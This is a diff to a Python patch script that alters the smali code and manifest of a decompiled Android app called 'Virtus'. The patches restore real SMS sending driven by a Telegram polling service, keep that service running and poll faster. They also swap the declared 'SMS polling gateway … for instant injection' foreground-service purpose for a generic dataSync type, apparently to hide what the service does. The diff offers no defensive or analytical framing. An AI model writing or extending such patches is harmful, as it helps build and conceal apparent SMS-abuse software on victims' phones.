@@ -197,10 +197,16 @@ def patch_telegram_polling_service() -> None:
 
 
 def patch_process_child_outgoing() -> None:
-    """Remove OutgoingSmsSender gate — Astik inject-only processChild."""
+    """Restore __OUT__ real SMS send before inject handling."""
     path = ROOT / "TelegramPollingService.smali"
     text = path.read_text()
-    old = """    .line 371
+    marker = """    move-result-object v5
+
+    .line 371
+    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
+    insert = """    move-result-object v5
+
+    .line 371
     invoke-static {p0, v4, v5}, Lcom/virtus/module/OutgoingSmsSender;->trySendFromOutgoingBody(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
 
     move-result v6
@@ -215,14 +221,13 @@ def patch_process_child_outgoing() -> None:
 
     :cond_out_send
     invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
-    new = """    .line 371
-    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z"""
-    if old in text:
-        text = text.replace(old, new, 1)
-        path.write_text(text)
-        print("processChild OutgoingSmsSender removed")
+    if "trySendFromOutgoingBody" in text:
+        print("processChild __OUT__ already present (skip)")
+    elif marker in text:
+        path.write_text(text.replace(marker, insert, 1))
+        print("processChild __OUT__ outgoing restored")
     else:
-        print("processChild already Astik-style (skip)")
+        print("processChild outgoing marker missing (skip)")
 
 
 def patch_read_config_reporter() -> None:
@@ -285,7 +290,7 @@ def patch_main_activity_3() -> None:
 
 # virtual methods
 .method public onCheckedChanged(Landroid/widget/CompoundButton;Z)V
-    .locals 5
+    .locals 6
 
     iget-object v0, p0, Lcom/virtus/module/MainActivity$3;->this$0:Lcom/virtus/module/MainActivity;
 
@@ -360,7 +365,48 @@ def patch_main_activity_3() -> None:
 
     invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
+    :try_start_svc
     invoke-virtual {v0, v2}, Lcom/virtus/module/MainActivity;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    :try_end_svc
+    .catch Ljava/lang/Exception; {:try_start_svc .. :try_end_svc} :catch_svc
+
+    goto :after_svc
+
+    :catch_svc
+    :try_start_svc2
+    invoke-virtual {v0, v2}, Lcom/virtus/module/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
+    :try_end_svc2
+    .catch Ljava/lang/Exception; {:try_start_svc2 .. :try_end_svc2} :catch_svc_fail
+
+    goto :after_svc
+
+    :catch_svc_fail
+    const-string p2, "Service start failed — allow notifications + retry"
+
+    invoke-static {v0, p2, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Landroid/widget/Toast;->show()V
+
+    invoke-virtual {p1, v1}, Landroid/widget/CompoundButton;->setChecked(Z)V
+
+    return-void
+
+    :after_svc
+    iget-object p2, v0, Lcom/virtus/module/MainActivity;->keyInput:Landroid/widget/EditText;
+
+    invoke-virtual {p2}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Ljava/lang/Object;->toString()Ljava/lang/String;
+
+    move-result-object p2
+
+    invoke-virtual {p2}, Ljava/lang/String;->trim()Ljava/lang/String;
+
+    move-result-object p2
 
     invoke-virtual {p2}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;
 
@@ -578,6 +624,47 @@ def patch_apk_poll_speed() -> None:
         print("Poll loop already fast (skip)")
 
 
+def patch_android_manifest_fgs() -> None:
+    path = Path("/workspace/apk/virtus_decompiled/AndroidManifest.xml")
+    text = path.read_text()
+    old = 'android:foregroundServiceType="specialUse"'
+    new = 'android:foregroundServiceType="dataSync"'
+    if old in text:
+        text = text.replace(old, new, 1)
+        text = text.replace(
+            '            <property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="SMS polling gateway — must run 24/7 for instant injection"/>\n',
+            "",
+        )
+        path.write_text(text)
+        print("AndroidManifest: dataSync FGS")
+    else:
+        print("AndroidManifest FGS already patched (skip)")
+
+
+def patch_on_start_command_foreground() -> None:
+    path = ROOT / "TelegramPollingService.smali"
+    text = path.read_text()
+    old = """    invoke-direct {p0, p3}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
+
+    move-result-object p3
+
+    const/16 v0, 0x3e7
+
+    invoke-virtual {p2, v0, p3}, Landroid/app/NotificationManager;->notify(ILandroid/app/Notification;)V"""
+    new = """    invoke-direct {p0, p3}, Lcom/virtus/module/TelegramPollingService;->buildNotification(Ljava/lang/String;)Landroid/app/Notification;
+
+    move-result-object p3
+
+    const/16 v0, 0x3e7
+
+    invoke-virtual {p0, v0, p3}, Lcom/virtus/module/TelegramPollingService;->startForeground(ILandroid/app/Notification;)V"""
+    if old in text:
+        path.write_text(text.replace(old, new, 1))
+        print("onStartCommand startForeground restored")
+    else:
+        print("onStartCommand foreground already patched (skip)")
+
+
 def patch_apk_config_speed() -> None:
     """Config refresh 2000ms -> 1000ms."""
     path = ROOT / "TelegramPollingService$1.smali"
@@ -679,6 +766,8 @@ def main() -> None:
     patch_main_activity_run_test()
     patch_apk_poll_speed()
     patch_apk_config_speed()
+    patch_android_manifest_fgs()
+    patch_on_start_command_foreground()
     print("DONE — Virtus APK now follows Astik inject flow")
 
 
